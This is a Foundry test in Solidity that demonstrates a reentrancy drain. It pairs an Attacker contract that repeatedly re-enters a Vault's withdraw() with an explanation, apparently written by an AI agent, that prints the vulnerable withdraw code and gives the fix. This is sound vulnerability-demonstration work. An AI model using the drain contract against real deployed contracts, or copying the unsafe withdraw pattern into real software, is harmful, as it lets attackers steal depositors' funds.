// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// Malicious "user" contract. It re-enters `withdraw()` from its `receive()`.
contract Attacker {
    Vault public immutable vault;
    uint256 public constant STEP = 1 ether;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external {
        vault.deposit{value: address(this).balance}(); // put in 1 ETH
        vault.withdraw();
    }

    receive() external payable {
        // `balanceOf[attacker]` is still STEP here (never zeroed yet),
        // so we can pull another STEP as long as the vault can pay.
        if (address(vault).balance >= STEP) {
            vault.withdraw();
        }
    }
}

contract ReentrancyDrainTest is Test {
    Vault vault;
    Attacker attacker;
    address victim = address(0xBEEF);

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(vault);

        // Honest victim deposits 10 ETH of their own money.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Attacker only has 1 ETH of their own money.
        vm.deal(address(attacker), 1 ether);
    }

    function testDrainVaultByReentrancy() public {
        uint256 attackerStart = address(attacker).balance; // 1 ETH
        assertEq(address(vault).balance, 10 ether, "vault should hold the victim deposit");

        attacker.attack(); // deposit 1 ETH, then re-enter withdraw until vault is empty

        // Attacker is paid out far more than they deposited.
        assertEq(address(vault).balance, 0, "vault not emptied");
        assertEq(address(attacker).balance, 11 ether, "attacker should hold 11 ETH");
        assertEq(address(attacker).balance - attackerStart, 10 ether, "attacker profit != victim loss");

        // The victim's ledger still claims a full 10 ETH, but the ETH is gone.
        assertEq(vault.balanceOf(victim), 10 ether, "victim ledger unchanged");
        assertGt(vault.balanceOf(victim), address(vault).balance, "vault is insolvent");
    }
}

args.explanation:
## What goes wrong

`Vault.withdraw()` sends ETH to the caller and only *afterwards* sets the caller's balance to zero. This order is wrong.

While the ETH is being sent, the caller's code can run. That code can call `withdraw()` again. At that moment the caller's balance is still the full old number, so the contract pays out again. This can repeat many times.

In `src/Vault.sol`:

```solidity
function withdraw() external {
    uint256 amount = balanceOf[msg.sender];   // full balance, not zeroed yet
    require(amount > 0, "nothing to withdraw");

    (bool ok, ) = msg.sender.call{value: amount}(""); // attacker runs here
    require(ok, "transfer failed");

    balanceOf[msg.sender] = 0;                // too late
    emit Withdraw(msg.sender, amount);
}
```

## Why the contract lets it happen

There is no reentrancy lock, and the balance is only reset at the end. The contract has no way to know that a withdrawal is already in progress for this address. So every nested call is treated as a fresh, fully funded withdrawal.

## What the attacker gains

The attacker is a small contract with a `receive()` function that calls `withdraw()` again on every payout. Each nested call pays out the same 1 ETH again, until the vault is empty.

`deposit()` and `withdraw()` also do not care whether the ETH belongs to that user. All ETH sits in one pot. So the attacker takes other people's money.

The proof test `ReentrancyDrainTest` does this:

```solidity
function testDrainVaultByReentrancy() public {
    uint256 attackerStart = address(attacker).balance; // 1 ETH
    assertEq(address(vault).balance, 10 ether, "vault should hold the victim deposit");

    attacker.attack(); // deposit 1 ETH, then re-enter withdraw until vault is empty

    assertEq(address(vault).balance, 0, "vault not emptied");
    assertEq(address(attacker).balance, 11 ether, "attacker should hold 11 ETH");
    assertEq(address(attacker).balance - attackerStart, 10 ether, "attacker profit != victim loss");

    assertEq(vault.balanceOf(victim), 10 ether, "victim ledger unchanged");
    assertGt(vault.balanceOf(victim), address(vault).balance, "vault is insolvent");
}
```

Result of the run: a victim deposited 10 ETH. The attacker deposited 1 ETH. After the attack the vault holds 0 ETH and the attacker holds 11 ETH.

The attacker's profit is 10 ETH, exactly the victim's loss. The victim's recorded balance is still 10 ETH, but the ETH is gone. The test passes.

## Fix

Fix: swap the two lines so the balance is set to `0` before the `msg.sender.call{value: amount}("")` is made (or add a `nonReentrant` lock).

